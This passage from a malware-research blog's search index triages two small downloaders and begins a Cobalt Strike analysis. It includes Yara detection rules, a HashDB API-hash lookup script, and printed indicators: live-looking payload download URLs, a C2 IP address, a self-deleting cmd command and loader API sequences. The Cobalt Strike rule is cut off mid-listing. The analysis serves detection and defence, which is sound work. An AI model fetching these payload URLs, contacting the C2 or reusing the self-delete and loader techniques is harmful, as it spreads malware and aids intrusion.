            "content": "Overview . We are going to take a look at two different downloaders, which are so simple they don&#39;t have great static detection or information extraction in UnpacMe yet! Our goal is to generate some Yara rules, or maybe some code to identify and extract the relevant info (download URL) in a generic static way. . Samples . 1a10e2940151982f2ab4f1e62be6e4f53074a2ffb90c7977e16d6a183db98695 | 9211ebf25c3cd3641451c95c50c1d3b7b2a4c53c36fa36564f3c1a177a0cda3d | . Triage of 9211... . The samples has a plaintext URL and the download functionality is not obfuscated/packed and can be identifed using CAPA as seen in UnpacMe. . The hardcoded URL is: http://apuservis.pe/ocultar/fw%d.exe. . There are 2 loops used to generate ULRs from 1 - 7 calling the URLs: . http://apuservis.pe/ocultar/fw1.exe | http://apuservis.pe/ocultar/fw2.exe | http://apuservis.pe/ocultar/fw3.exe | http://apuservis.pe/ocultar/fw4.exe | http://apuservis.pe/ocultar/fw5.exe | http://apuservis.pe/ocultar/fw6.exe | . The file is writtent to %APPDATA% with a random file name using a random number &quot;%08x.exe. . To execute the file the API ShellExecuteW is resolved dynamically using a CRC32 hash then it is called with the open command. . import requests HASHDB_HUNT_URL = &#39;https://hashdb.openanalysis.net/hunt&#39; HASHDB_HASH_URL = &#39;https://hashdb.openanalysis.net/hash&#39; api_hash = 0x1FA8A1D4 + 5 hunt_request = {&quot;hashes&quot;: [api_hash]} r = requests.post(HASHDB_HUNT_URL, json=hunt_request) print(r.json()) . {&#39;hits&#39;: [{&#39;algorithm&#39;: &#39;crc32&#39;, &#39;count&#39;: 1, &#39;hitrate&#39;: 1.0}]} . r = requests.get(HASHDB_HASH_URL + &#39;/crc32/&#39; + str(api_hash)) print(r.json()) . {&#39;hashes&#39;: [{&#39;hash&#39;: 531145177, &#39;string&#39;: {&#39;string&#39;: &#39;ShellExecuteW&#39;, &#39;is_api&#39;: True, &#39;permutation&#39;: &#39;api&#39;, &#39;api&#39;: &#39;ShellExecuteW&#39;, &#39;modules&#39;: [&#39;shell32&#39;]}}]} . Possible IOCs . There is self-delete functionatlity using the batch script: /c ping 127.0.0.1 &amp;&amp; del &quot;%s &quot; &gt;&gt; NUL . | They use GetEnvironmentVariableW(L&quot;ComSpec&quot;, Filename, 0x104u) to get the cmd.exe path. . | They have a hardcoded URL http://apuservis.pe/ocultar/fw%d.exe . | They have a hardcoded HTTP header GET %S HTTP/1.1 . | They have a CRC32 hash algo used for the dynamic API resolving . | . Yara rule . rule download_hunt { meta: description = &quot;Hunt for simple downloaders&quot; strings: $s1 = &quot;/c ping 127.0.0.1 &amp;&amp; del &quot;%s &quot; &gt;&gt; NUL&quot; wide ascii nocase $s2 = &quot;http://&quot; wide ascii $s3 = &quot;GET %S HTTP/1.1&quot; wide ascii nocase $x1 = { 35 20 83 B8 ED } $x2 = { 81 F? 20 83 B8 ED } condition: all of ($s*) and 1 of ($x*) } . ** let&#39;s also check file size . ** these are small binaries with very few functions, one ID trick might be to try and identify how many functions and only trigger an bins with a few functions... for this we could maybe used CFG count... from @psifertex . You can see the function table from a CFG binary with dumpbin /loadconfig test.exe . Yara Rule Revisions . We ran a scan with the above rule over the MalwareBazaar corpus and the results only gave us one match (the sample we were originally looking at). This is a bad rule. We are going to loosen the rule to see if we can catch more samples. . rule download_hunt_2 { meta: description = &quot;Hunt for simple downloaders&quot; strings: $s1 = &quot;/c ping 127.0.0.1 &amp;&amp; del&quot; wide ascii xor $s2 = &quot;http://&quot; wide ascii xor condition: all of ($s*) } . . Triage of 1a10e... . &quot;‰ºÅÂàíËê•ÈîÄÂ≤ó‰Ωç_ÂæêÊµ©Èò≥_Á°ïÂ£´.exe&quot;: 1a10e2940151982f2ab4f1e62be6e4f53074a2ffb90c7977e16d6a183db98695139.9.138[.]190 pic.twitter.com/pquwEW1ZW0 . &mdash; MalwareHunterTeam (@malwrhunterteam) June 11, 2022 . There is a PDB path in the binary C: Users H0e4a0r1t Documents Visual Studio 2015 Projects worddy x64 Release worddy.pdb. Based on the username H0e4a0r1t we found a possible GitHub https://github.com/h0e4a0r1t and this looks like maybe a &quot;redteam&quot; tools developer?? . Possible IOCs . There is an embeded blob that is encrypted with a singl-byte XOR 0x99 . | Once decrypted the blob is a standard Cobalt Strike loader with the following &quot;header&quot; strings. . | . Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: http://code.jquery.com/ Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko . The C2 IP is 139.9.138.190 . | To load and launch the decrypted shellcode they use the following APIs . VirtualAlloc | WriteProcessMemory | QueueUserAPC | . | . Yara Rule . rule cs_downloader { meta: description = &quot;Hunt for Cobalt Strike downloader&quot; strings: $s1 = &quot;Accept-Language:&quot; xor(0x01-0xff) $s2 = &quot;Referer: http://code.jquery.com/&quot; xor(0x01-0xff) $s3 = &quot;Accept-Encoding: gzip, deflate&quot; xor(0x01-0xff) $s4 = &quot;User-Agent:&quot; xor(0x01-0xff) condition: all of ($s*) and uint32(@s1) == uint32(@s3) } . Yara Results . We only got 2 hits, this rule also sucks, lol! . [ { &quot;rule&quot;: &quot;cs_downloader&quot;, &quot;malware&quot;: &quot;CobaltStrike&quot;, &quot;sha256&quot;: &quot;e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48&quot;, &quot;mime_type&quot;: &quot;application/x-msdownload&quot;, &quot;virustotal_link&quot;: &quot;https://www.virustotal.com/gui/file/e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48/detection&quot;, &quot;malwarebazaar_link&quot;: &quot;https://bazaar.abuse.ch/sample/e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48/&quot;, &quot;tags&quot;: [] }, { &quot;rule&quot;: &quot;cs_downloader&quot;, &quot;malware&quot;: &quot;CobaltStrike&quot;, &quot;sha256&quot;: &quot;6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f&quot;, &quot;mime_type&quot;: &quot;application/x-msdownload&quot;, &quot;virustotal_link&quot;: &quot;https://www.virustotal.com/gui/file/6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f/detection&quot;, &quot;malwarebazaar_link&quot;: &quot;https://bazaar.abuse.ch/sample/6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f/&quot;, &quot;tags&quot;: [] } ] .",
            "url": "https://research.openanalysis.net/downloader/research/detection_engineering/yara/triage/2022/06/12/downloader-triage.html",
            "relUrl": "/downloader/research/detection_engineering/yara/triage/2022/06/12/downloader-triage.html",
            "date": " ‚Ä¢ Jun 12, 2022"
        }
        
    
  
    
        ,"post45": {
            "title": "Cobalt Strike Analysis",
            "content": "Overview . Samples . Malware Bazaar CobaltStrike Tags | unpacked - ca847340992ff249d8b4425a942d96be6a9380a381123c693475030fd598e5d5 | unpacked - 95c50f8c585ec69dab7a9d26a2684da2e44d5539edb75e4ecc53c18092cdc7b1 | unpacked - 36cfac5ccea3f56d8e042bf81fecdc82652c5b9665dbc46da5070384e3b4664e | emotet packed - 191038e4da8d2913c4aae01723d786fca9c34e2e531d56807742e9470ef54afb | . References . scemu sellcode analysis tool | scdbg blog | scdbg github | dumpulator | CS beacon config extract (sentinal-one github) | Cobalt Strike&#39;s Malleable C2 under the hood | Malleable Command and Control | Didier Stevens CS analysis tools | . Config Extraction . The CS beacon config data can either exit as plaintext, or encrypted with a single byte XOR. There is a pattern in the config 00 01 00 01 00 02 that can be used to identify it even when encrypted, by brute forcing the XOR. Once the config has been identified the Sentinal-One CS beacon config extractor will work to extract the config. One upgrade that can be made to the extractor is to make the decrytion generic (currently it only supports the XOR keys 0x69 and 0x2e. . Given the above, the main challenge is to unpack and identify the CS beacon in packed samples. We can use the following Yara rule to ID beacons where the config can be extracted. . Reflective Loader PE Header (DOS Header) . In addition to this yara rule there is also an interesting characteristic in the PE file DOS header of CS beacons that use a reflective loader. The normal M Z 0x90 0x00 bytes are replaced with M Z A R U H. This has been used by other Yara rules to identify the beacon PE, but in our research we found that simply identifying the encrypted payload bytes was enough. . Yara Rule . This is rule that will match the beacon (encrypted) payload . rule CobaltStrike_C2_Encoded_XOR_Config_Indicator { meta: description = &quot;Detects CobaltStrike C2 encoded profile configuration&quot; author = &quot;yara@s3c.za.net&quot; date = &quot;2021-07-08&quot; strings: $s000 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 03 00 02 00 04 ?? ?? ?? ?? 00 04 00 02 00 04 ?? ?? ?? ?? 00 05 00 01 00 02 ?? ?? } $s001 = { 01 00 01 00 01 03 ?? ?? 01 03 01 00 01 03 ?? ?? 01 02 01 03 01 05 ?? ?? ?? ?? 01 05 01 03 01 05 ?? ?? ?? ?? 01 04 01 00 01 03 ?? ?? } $s002 = { 02 03 02 03 02 00 ?? ?? 02 00 02 03 02 00 ?? ?? 02 01 02 00 02 06 ?? ?? ?? ?? 02 06 02 00 02 06 ?? ?? ?? ?? 02 07 02 03 02 00 ?? ?? } $s003 = { 03 02 03 02 03 01 ?? ?? 03 01 03 02 03 01 ?? ?? 03 00 03 01 03 07 ?? ?? ?? ?? 03 07 03 01 03 07 ?? ?? ?? ?? 03 06 03 02 03 01 ?? ?? } $s004 = { 04 05 04 05 04 06 ?? ?? 04 06 04 05 04 06 ?? ?? 04 07 04 06 04 00 ?? ?? ?? ?? 04 00 04 06 04 00 ?? ?? ?? ?? 04 01 04 05 04 06 ?? ?? } $s005 = { 05 04 05 04 05 07 ?? ?? 05 07 05 04 05 07 ?? ?? 05 06 05 07 05 01 ?? ?? ?? ?? 05 01 05 07 05 01 ?? ?? ?? ?? 05 00 05 04 05 07 ?? ?? } $s006 = { 06 07 06 07 06 04 ?? ?? 06 04 06 07 06 04 ?? ?? 06 05 06 04 06 02 ?? ?? ?? ?? 06 02 06 04 06 02 ?? ?? ?? ?? 06 03 06 07 06 04 ?? ?? } $s007 = { 07 06 07 06 07 05 ?? ?? 07 05 07 06 07 05 ?? ?? 07 04 07 05 07 03 ?? ?? ?? ?? 07 03 07 05 07 03 ?? ?? ?? ?? 07 02 07 06 07 05 ?? ?? } $s008 = { 08 09 08 09 08 0A ?? ?? 08 0A 08 09 08 0A ?? ?? 08 0B 08 0A 08 0C ?? ?? ?? ?? 08 0C 08 0A 08 0C ?? ?? ?? ?? 08 0D 08 09 08 0A ?? ?? } $s009 = { 09 08 09 08 09 0B ?? ?? 09 0B 09 08 09 0B ?? ?? 09 0A 09 0B 09 0D ?? ?? ?? ?? 09 0D 09 0B 09 0D ?? ?? ?? ?? 09 0C 09 08 09 0B ?? ?? } $s010 = { 0A 0B 0A 0B 0A 08 ?? ?? 0A 08 0A 0B 0A 08 ?? ?? 0A 09 0A 08 0A 0E ?? ?? ?? ?? 0A 0E 0A 08 0A 0E ?? ?? ?? ?? 0A 0F 0A 0B 0A 08 ?? ?? } $s011 = { 0B 0A 0B 0A 0B 09 ?? ?? 0B 09 0B 0A 0B 09 ?? ?? 0B 08 0B 09 0B 0F ?? ?? ?? ?? 0B 0F 0B 09 0B 0F ?? ?? ?? ?? 0B 0E 0B 0A 0B 09 ?? ?? } $s012 = { 0C 0D 0C 0D 0C 0E ?? ?? 0C 0E 0C 0D 0C 0E ?? ?? 0C 0F 0C 0E 0C 08 ?? ?? ?? ?? 0C 08 0C 0E 0C 08 ?? ?? ?? ?? 0C 09 0C 0D 0C 0E ?? ?? } $s013 = { 0D 0C 0D 0C 0D 0F ?? ?? 0D 0F 0D 0C 0D 0F ?? ?? 0D 0E 0D 0F 0D 09 ?? ?? ?? ?? 0D 09 0D 0F 0D 09 ?? ?? ?? ?? 0D 08 0D 0C 0D 0F ?? ?? } $s014 = { 0E 0F 0E 0F 0E 0C ?? ?? 0E 0C 0E 0F 0E 0C ?? ?? 0E 0D 0E 0C 0E 0A ?? ?? ?? ?? 0E 0A 0E 0C 0E 0A ?? ?? ?? ?? 0E 0B 0E 0F 0E 0C ?? ?? } $s015 = { 0F 0E 0F 0E 0F 0D ?? ?? 0F 0D 0F 0E 0F 0D ?? ?? 0F 0C 0F 0D 0F 0B ?? ?? ?? ?? 0F 0B 0F 0D 0F 0B ?? ?? ?? ?? 0F 0A 0F 0E 0F 0D ?? ?? } $s016 = { 10 11 10 11 10 12 ?? ?? 10 12 10 11 10 12 ?? ?? 10 13 10 12 10 14 ?? ?? ?? ?? 10 14 10 12 10 14 ?? ?? ?? ?? 10 15 10 11 10 12 ?? ?? } $s017 = { 11 10 11 10 11 13 ?? ?? 11 13 11 10 11 13 ?? ?? 11 12 11 13 11 15 ?? ?? ?? ?? 11 15 11 13 11 15 ?? ?? ?? ?? 11 14 11 10 11 13 ?? ?? } $s018 = { 12 13 12 13 12 10 ?? ?? 12 10 12 13 12 10 ?? ?? 12 11 12 10 12 16 ?? ?? ?? ?? 12 16 12 10 12 16 ?? ?? ?? ?? 12 17 12 13 12 10 ?? ?? } $s019 = { 13 12 13 12 13 11 ?? ?? 13 11 13 12 13 11 ?? ?? 13 10 13 11 13 17 ?? ?? ?? ?? 13 17 13 11 13 17 ?? ?? ?? ?? 13 16 13 12 13 11 ?? ?? } $s020 = { 14 15 14 15 14 16 ?? ?? 14 16 14 15 14 16 ?? ?? 14 17 14 16 14 10 ?? ?? ?? ?? 14 10 14 16 14 10 ?? ?? ?? ?? 14 11 14 15 14 16 ?? ?? } $s021 = { 15 14 15 14 15 17 ?? ?? 15 17 15 14 15 17 ?? ?? 15 16 15 17 15 11 ?? ?? ?? ?? 15 11 15 17 15 11 ?? ?? ?? ?? 15 10 15 14 15 17 ?? ?? } $s022 = { 16 17 16 17 16 14 ?? ?? 16 14 16 17 16 14 ?? ?? 16 15 16 14 16 12 ?? ?? ?? ?? 16 12 16 14 16 12 ?? ?? ?? ?? 16 13 16 17 16 14 ?? ?? } $s023 = { 17 16 17 16 17 15 ?? ?? 17 15 17 16 17 15 ?? ?? 17 14 17 15 17 13 ?? ?? ?? ?? 17 13 17 15 17 13 ?? ?? ?? ?? 17 12 17 16 17 15 ?? ?? } $s024 = { 18 19 18 19 18 1A ?? ?? 18 1A 18 19 18 1A ?? ?? 18 1B 18 1A 18 1C ?? ?? ?? ?? 18 1C 18 1A 18 1C ?? ?? ?? ?? 18 1D 18 19 18 1A ?? ?? } $s025 = { 19 18 19 18 19 1B ?? ?? 19 1B 19 18 19 1B ?? ?? 19 1A 19 1B 19 1D ?? ?? ?? ?? 19 1D 19 1B 19 1D ?? ?? ?? ?? 19 1C 19 18 19 1B ?? ?? } $s026 = { 1A 1B 1A 1B 1A 18 ?? ?? 1A 18 1A 1B 1A 18 ?? ?? 1A 19 1A 18 1A 1E ?? ?? ?? ?? 1A 1E 1A 18 1A 1E ?? ?? ?? ?? 1A 1F 1A 1B 1A 18 ?? ?? } $s027 = { 1B 1A 1B 1A 1B 19 ?? ?? 1B 19 1B 1A 1B 19 ?? ?? 1B 18 1B 19 1B 1F ?? ?? ?? ?? 1B 1F 1B 19 1B 1F ?? ?? ?? ?? 1B 1E 1B 1A 1B 19 ?? ?? } $s028 = { 1C 1D 1C 1D 1C 1E ?? ?? 1C 1E 1C 1D 1C 1E ?? ?? 1C 1F 1C 1E 1C 18 ?? ?? ?? ?? 1C 18 1C 1E 1C 18 ?? ?? ?? ?? 1C 19 1C 1D 1C 1E ?? ?? } $s029 = { 1D 1C 1D 1C 1D 1F ?? ?? 1D 1F 1D 1C 1D 1F ?? ?? 1D 1E 1D 1F 1D 19 ?? ?? ?? ?? 1D 19 1D 1F 1D 19 ?? ?? ?? ?? 1D 18 1D 1C 1D 1F ?? ?? } $s030 = { 1E 1F 1E 1F 1E 1C ?? ?? 1E 1C 1E 1F 1E 1C ?? ?? 1E 1D 1E 1C 1E 1A ?? ?? ?? ?? 1E 1A 1E 1C 1E 1A ?? ?? ?? ?? 1E 1B 1E 1F 1E 1C ?? ?? } $s031 = { 1F 1E 1F 1E 1F 1D ?? ?? 1F 1D 1F 1E 1F 1D ?? ?? 1F 1C 1F 1D 1F 1B ?? ?? ?? ?? 1F 1B 1F 1D 1F 1B ?? ?? ?? ?? 1F 1A 1F 1E 1F 1D ?? ?? } $s032 = { 20 21 20 21 20 22 ?? ?? 20 22 20 21 20 22 ?? ?? 20 23 20 22 20 24 ?? ?? ?? ?? 20 24 20 22 20 24 ?? ?? ?? ?? 20 25 20 21 20 22 ?? ?? } $s033 = { 21 20 21 20 21 23 ?? ?? 21 23 21 20 21 23 ?? ?? 21 22 21 23 21 25 ?? ?? ?? ?? 21 25 21 23 21 25 ?? ?? ?? ?? 21 24 21 20 21 23 ?? ?? } $s034 = { 22 23 22 23 22 20 ?? ?? 22 20 22 23 22 20 ?? ?? 22 21 22 20 22 26 ?? ?? ?? ?? 22 26 22 20 22 26 ?? ?? ?? ?? 22 27 22 23 22 20 ?? ?? } $s035 = { 23 22 23 22 23 21 ?? ?? 23 21 23 22 23 21 ?? ?? 23 20 23 21 23 27 ?? ?? ?? ?? 23 27 23 21 23 27 ?? ?? ?? ?? 23 26 23 22 23 21 ?? ?? } $s036 = { 24 25 24 25 24 26 ?? ?? 24 26 24 25 24 26 ?? ?? 24 27 24 26 24 20 ?? ?? ?? ?? 24 20 24 26 24 20 ?? ?? ?? ?? 24 21 24 25 24 26 ?? ?? } $s037 = { 25 24 25 24 25 27 ?? ?? 25 27 25 24 25 27 ?? ?? 25 26 25 27 25 21 ?? ?? ?? ?? 25 21 25 27 25 21 ?? ?? ?? ?? 25 20 25 24 25 27 ?? ?? } $s038 = { 26 27 26 27 26 24 ?? ?? 26 24 26 27 26 24 ?? ?? 26 25 26 24 26 22 ?? ?? ?? ?? 26 22 26 24 26 22 ?? ?? ?? ?? 26 23 26 27 26 24 ?? ?? } $s039 = { 27 26 27 26 27 25 ?? ?? 27 25 27 26 27 25 ?? ?? 27 24 27 25 27 23 ?? ?? ?? ?? 27 23 27 25 27 23 ?? ?? ?? ?? 27 22 27 26 27 25 ?? ?? } $s040 = { 28 29 28 29 28 2A ?? ?? 28 2A 28 29 28 2A ?? ?? 28 2B 28 2A 28 2C ?? ?? ?? ?? 28 2C 28 2A 28 2C ?? ?? ?? ?? 28 2D 28 29 28 2A ?? ?? } $s041 = { 29 28 29 28 29 2B ?? ?? 29 2B 29 28 29 2B ?? ?? 29 2A 29 2B 29 2D ?? ?? ?? ?? 29 2D 29 2B 29 2D ?? ?? ?? ?? 29 2C 29 28 29 2B ?? ?? } $s042 = { 2A 2B 2A 2B 2A 28 ?? ?? 2A 28 2A 2B 2A 28 ?? ?? 2A 29 2A 28 2A 2E ?? ?? ?? ?? 2A 2E 2A 28 2A 2E ?? ?? ?? ?? 2A 2F 2A 2B 2A 28 ?? ?? } $s043 = { 2B 2A 2B 2A 2B 29 ?? ?? 2B 29 2B 2A 2B 29 ?? ?? 2B 28 2B 29 2B 2F ?? ?? ?? ?? 2B 2F 2B 29 2B 2F ?? ?? ?? ?? 2B 2E 2B 2A 2B 29 ?? ?? } $s044 = { 2C 2D 2C 2D 2C 2E ?? ?? 2C 2E 2C 2D 2C 2E ?? ?? 2C 2F 2C 2E 2C 28 ?? ?? ?? ?? 2C 28 2C 2E 2C 28 ?? ?? ?? ?? 2C 29 2C 2D 2C 2E ?? ?? } $s045 = { 2D 2C 2D 2C 2D 2F ?? ?? 2D 2F 2D 2C 2D 2F ?? ?? 2D 2E 2D 2F 2D 29 ?? ?? ?? ?? 2D 29 2D 2F 2D 29 ?? ?? ?? ?? 2D 28 2D 2C 2D 2F ?? ?? } $s046 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E 2D 2E 2C 2E 2A ?? ?? ?? ?? 2E 2A 2E 2C 2E 2A ?? ?? ?? ?? 2E 2B 2E 2F 2E 2C ?? ?? } $s047 = { 2F 2E 2F 2E 2F 2D ?? ?? 2F 2D 2F 2E 2F 2D ?? ?? 2F 2C 2F 2D 2F 2B ?? ?? ?? ?? 2F 2B 2F 2D 2F 2B ?? ?? ?? ?? 2F 2A 2F 2E 2F 2D ?? ?? } $s048 = { 30 31 30 31 30 32 ?? ?? 30 32 30 31 30 32 ?? ?? 30 33 30 32 30 34 ?? ?? ?? ?? 30 34 30 32 30 34 ?? ?? ?? ?? 30 35 30 31 30 32 ?? ?? } $s049 = { 31 30 31 30 31 33 ?? ?? 31 33 31 30 31 33 ?? ?? 31 32 31 33 31 35 ?? ?? ?? ?? 31 35 31 33 31 35 ?? ?? ?? ?? 31 34 31 30 31 33 ?? ?? } $s050 = { 32 33 32 33 32 30 ?? ?? 32 30 32 33 32 30 ?? ?? 32 31 32 30 32 36 ?? ?? ?? ?? 32 36 32 30 32 36 ?? ?? ?? ?? 32 37 32 33 32 30 ?? ?? } $s051 = { 33 32 33 32 33 31 ?? ?? 33 31 33 32 33 31 ?? ?? 33 30 33 31 33 37 ?? ?? ?? ?? 33 37 33 31 33 37 ?? ?? ?? ?? 33 36 33 32 33 31 ?? ?? } $s052 = { 34 35 34 35 34 36 ?? ?? 34 36 34 35 34 36 ?? ?? 34 37 34 36 34 30 ?? ?? ?? ?? 34 30 34 36 34 30 ?? ?? ?? ?? 34 31 34 35 34 36 ?? ?? } $s053 = { 35 34 35 34 35 37 ?? ?? 35 37 35 34 35 37 ?? ?? 35 36 35 37 35 31 ?? ?? ?? ?? 35 31 35 37 35 31 ?? ?? ?? ?? 35 30 35 34 35 37 ?? ?? } $s054 = { 36 37 36 37 36 34 ?? ?? 36 34 36 37 36 34 ?? ?? 36 35 36 34 36 32 ?? ?? ?? ?? 36 32 36 34 36 32 ?? ?? ?? ?? 36 33 36 37 36 34 ?? ?? } $s055 = { 37 36 37 36 37 35 ?? ?? 37 35 37 36 37 35 ?? ?? 37 34 37 35 37 33 ?? ?? ?? ?? 37 33 37 35 37 33 ?? ?? ?? ?? 37 32 37 36 37 35 ?? ?? } $s056 = { 38 39 38 39 38 3A ?? ?? 38 3A 38 39 38 3A ?? ?? 38 3B 38 3A 38 3C ?? ?? ?? ?? 38 3C 38 3A 38 3C ?? ?? ?? ?? 38 3D 38 39 38 3A ?? ?? } $s057 = { 39 38 39 38 39 3B ?? ?? 39 3B 39 38 39 3B ?? ?? 39 3A 39 3B 39 3D ?? ?? ?? ?? 39 3D 39 3B 39 3D ?? ?? ?? ?? 39 3C 39 38 39 3B ?? ?? } $s058 = { 3A 3B 3A 3B 3A 38 ?? ?? 3A 38 3A 3B 3A 38 ?? ?? 3A 39 3A 38 3A 3E ?? ?? ?? ?? 3A 3E 3A 38 3A 3E ?? ?? ?? ?? 3A 3F 3A 3B 3A 38 ?? ?? } $s059 = { 3B 3A 3B 3A 3B 39 ?? ?? 3B 39 3B 3A 3B 39 ?? ?? 3B 38 3B 39 3B 3F ?? ?? ?? ?? 3B 3F 3B 39 3B 3F ?? ?? ?? ?? 3B 3E 3B 3A 3B 39 ?? ?? } $s060 = { 3C 3D 3C 3D 3C 3E ?? ?? 3C 3E 3C 3D 3C 3E ?? ?? 3C 3F 3C 3E 3C 38 ?? ?? ?? ?? 3C 38 3C 3E 3C 38 ?? ?? ?? ?? 3C 39 3C 3D 3C 3E ?? ?? } $s061 = { 3D 3C 3D 3C 3D 3F ?? ?? 3D 3F 3D 3C 3D 3F ?? ?? 3D 3E 3D 3F 3D 39 ?? ?? ?? ?? 3D 39 3D 3F 3D 39 ?? ?? ?? ?? 3D 38 3D 3C 3D 3F ?? ?? } $s062 = { 3E 3F 3E 3F 3E 3C ?? ?? 3E 3C 3E 3F 3E 3C ?? ?? 3E 3D 3E 3C 3E 3A ?? ?? ?? ?? 3E 3A 3E 3C 3E 3A ?? ?? ?? ?? 3E 3B 3E 3F 3E 3C ?? ?? } $s063 = { 3F 3E 3F 3E 3F 3D ?? ?? 3F 3D 3F 3E 3F 3D ?? ?? 3F 3C 3F 3D 3F 3B ?? ?? ?? ?? 3F 3B 3F 3D 3F 3B ?? ?? ?? ?? 3F 3A 3F 3E 3F 3D ?? ?? } $s064 = { 40 41 40 41 40 42 ?? ?? 40 42 40 41 40 42 ?? ?? 40 43 40 42 40 44 ?? ?? ?? ?? 40 44 40 42 40 44 ?? ?? ?? ?? 40 45 40 41 40 42 ?? ?? } $s065 = { 41 40 41 40 41 43 ?? ?? 41 43 41 40 41 43 ?? ?? 41 42 41 43 41 45 ?? ?? ?? ?? 41 45 41 43 41 45 ?? ?? ?? ?? 41 44 41 40 41 43 ?? ?? } $s066 = { 42 43 42 43 42 40 ?? ?? 42 40 42 43 42 40 ?? ?? 42 41 42 40 42 46 ?? ?? ?? ?? 42 46 42 40 42 46 ?? ?? ?? ?? 42 47 42 43 42 40 ?? ?? } $s067 = { 43 42 43 42 43 41 ?? ?? 43 41 43 42 43 41 ?? ?? 43 40 43 41 43 47 ?? ?? ?? ?? 43 47 43 41 43 47 ?? ?? ?? ?? 43 46 43 42 43 41 ?? ?? } $s068 = { 44 45 44 45 44 46 ?? ?? 44 46 44 45 44 46 ?? ?? 44 47 44 46 44 40 ?? ?? ?? ?? 44 40 44 46 44 40 ?? ?? ?? ?? 44 41 44 45 44 46 ?? ?? } $s069 = { 45 44 45 44 45 47 ?? ?? 45 47 45 44 45 47 ?? ?? 45 46 45 47 45 41 ?? ?? ?? ?? 45 41 45 47 45 41 ?? ?? ?? ?? 45 40 45 44 45 47 ?? ?? } $s070 = { 46 47 46 47 46 44 ?? ?? 46 44 46 47 46 44 ?? ?? 46 45 46 44 46 42 ?? ?? ?? ?? 46 42 46 44 46 42 ?? ?? ?? ?? 46 43 46 47 46 44 ?? ?? } $s071 = { 47 46 47 46 47 45 ?? ?? 47 45 47 46 47 45 ?? ?? 47 44 47 45 47 43 ?? ?? ?? ?? 47 43 47 45 47 43 ?? ?? ?? ?? 47 42 47 46 47 45 ?? ?? } $s072 = { 48 49 48 49 48 4A ?? ?? 48 4A 48 49 48 4A ?? ?? 48 4B 48 4A 48 4C ?? ?? ?? ?? 48 4C 48 4A 48 4C ?? ?? ?? ?? 48 4D 48 49 48 4A ?? ?? } $s073 = { 49 48 49 48 49 4B ?? ?? 49 4B 49 48 49 4B ?? ?? 49 4A 49 4B 49 4D ?? ?? ?? ?? 49 4D 49 4B 49 4D ?? ?? ?? ?? 49 4C 49 48 49 4B ?? ?? } $s074 = { 4A 4B 4A 4B 4A 48 ?? ?? 4A 48 4A 4B 4A 48 ?? ?? 4A 49 4A 48 4A 4E ?? ?? ?? ?? 4A 4E 4A 48 4A 4E ?? ?? ?? ?? 4A 4F 4A 4B 4A 48 ?? ?? } $s075 = { 4B 4A 4B 4A 4B 49 ?? ?? 4B 49 4B 4A 4B 49 ?? ?? 4B 48 4B 49 4B 4F ?? ?? ?? ?? 4B 4F 4B 49 4B 4F ?? ?? ?? ?? 4B 4E 4B 4A 4B 49 ?? ?? } $s076 = { 4C 4D 4C 4D 4C 4E ?? ?? 4C 4E 4C 4D 4C 4E ?? ?? 4C 4F 4C 4E 4C 48 ?? ?? ?? ?? 4C 48 4C 4E 4C 48 ?? ?? ?? ?? 4C 49 4C 4D 4C 4E ?? ?? } $s077 = { 4D 4C 4D 4C 4D 4F ?? ?? 4D 4F 4D 4C 4D 4F ?? ?? 4D 4E 4D 4F 4D 49 ?? ?? ?? ?? 4D 49 4D 4F 4D 49 ?? ?? ?? ?? 4D 48 4D 4C 4D 4F ?? ?? } $s078 = { 4E 4F 4E 4F 4E 4C ?? ?? 4E 4C 4E 4F 4E 4C ?? ?? 4E 4D 4E 4C 4E 4A ?? ?? ?? ?? 4E 4A 4E 4C 4E 4A ?? ?? ?? ?? 4E 4B 4E 4F 4E 4C ?? ?? } $s079 = { 4F 4E 4F 4E 4F 4D ?? ?? 4F 4D 4F 4E 4F 4D ?? ?? 4F 4C 4F 4D 4F 4B ?? ?? ?? ?? 4F 4B 4F 4D 4F 4B ?? ?? ?? ?? 4F 4A 4F 4E 4F 4D ?? ?? } $s080 = { 50 51 50 51 50 52 ?? ?? 50 52 50 51 50 52 ?? ?? 50 53 50 52 50 54 ?? ?? ?? ?? 50 54 50 52 50 54 ?? ?? ?? ?? 50 55 50 51 50 52 ?? ?? } $s081 = { 51 50 51 50 51 53 ?? ?? 51 53 51 50 51 53 ?? ?? 51 52 51 53 51 55 ?? ?? ?? ?? 51 55 51 53 51 55 ?? ?? ?? ?? 51 54 51 50 51 53 ?? ?? } $s082 = { 52 53 52 53 52 50 ?? ?? 52 50 52 53 52 50 ?? ?? 52 51 52 50 52 56 ?? ?? ?? ?? 52 56 52 50 52 56 ?? ?? ?? ?? 52 57 52 53 52 50 ?? ?? } $s083 = { 53 52 53 52 53 51 ?? ?? 53 51 53 52 53 51 ?? ?? 53 50 53 51 53 57 ?? ?? ?? ?? 53 57 53 51 53 57 ?? ?? ?? ?? 53 56 53 52 53 51 ?? ?? } $s084 = { 54 55 54 55 54 56 ?? ?? 54 56 54 55 54 56 ?? ?? 54 57 54 56 54 50 ?? ?? ?? ?? 54 50 54 56 54 50 ?? ?? ?? ?? 54 51 54 55 54 56 ?? ?? } $s085 = { 55 54 55 54 55 57 ?? ?? 55 57 55 54 55 57 ?? ?? 55 56 55 57 55 51 ?? ?? ?? ?? 55 51 55 57 55 51 ?? ?? ?? ?? 55 50 55 54 55 57 ?? ?? } $s086 = { 56 57 56 57 56 54 ?? ?? 56 54 56 57 56 54 ?? ?? 56 55 56 54 56 52 ?? ?? ?? ?? 56 52 56 54 56 52 ?? ?? ?? ?? 56 53 56 57 56 54 ?? ?? } $s087 = { 57 56 57 56 57 55 ?? ?? 57 55 57 56 57 55 ?? ?? 57 54 57 55 57 53 ?? ?? ?? ?? 57 53 57 55 57 53 ?? ?? ?? ?? 57 52 57 56 57 55 ?? ?? } $s088 = { 